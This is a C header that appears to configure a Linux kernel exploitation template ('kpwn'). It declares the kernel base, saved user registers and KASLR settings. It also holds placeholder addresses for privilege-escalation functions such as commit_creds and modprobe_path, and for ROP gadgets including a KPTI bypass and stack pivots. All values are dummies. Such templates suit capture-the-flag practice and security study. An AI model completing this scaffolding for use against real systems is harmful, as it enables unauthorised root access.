#ifndef __KPWN_VARS_H
#define __KPWN_VARS_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* ------------------- uneditable ------------------- */
#define DUMMY_VALUE (0xdddddddddddddddd)
#define default_kbase (0xffffffff81000000)
#define kbase_offset (kbase - default_kbase)
#define PAGE_SIZE (0x1000)
extern uint64_t user_cs, user_ss, user_rsp, user_rflags;
extern uint64_t kbase;
extern uint64_t kheap;

/* -------------------- editable -------------------- */
#define CONFIG_PHYSICAL_START (0x1000000)
#define CONFIG_PHYSICAL_ALIGN (0x200000)
#define CONFIG_RANDOMIZE_BASE_MAX_OFFSET (0x40000000)
#define PUD_SIZE (0x40000000)

// addresses
#define addr_prepare_kernel_cred (DUMMY_VALUE + kbase_offset)
#define addr_init_cred (DUMMY_VALUE + kbase_offset)
#define addr_commit_creds (DUMMY_VALUE + kbase_offset)
#define addr_modprobe_path (DUMMY_VALUE + kbase_offset)

// gadgets
#define pop_rdi_ret (DUMMY_VALUE + kbase_offset)
#define pop_rcx_ret (DUMMY_VALUE + kbase_offset)
#define mov_rdi_rax_rep_ret (DUMMY_VALUE + kbase_offset)
#define bypass_kpti (DUMMY_VALUE + kbase_offset)
#define mov_prdx_rcx_ret (DUMMY_VALUE + kbase_offset)
#define mov_rax_prdx_ret (DUMMY_VALUE + kbase_offset)
#define mov_esp_0x39000000_ret (DUMMY_VALUE + kbase_offset)
#define add_rsp_0x140_pop6_ret (DUMMY_VALUE + kbase_offset)

// global variable initial values
#define INIT_KBASE (default_kbase)
#define INIT_KHEAP (0)
#define INIT_KASLR (true)

// config variables
extern bool kaslr;

#endif  // __KPWN_VARS_H
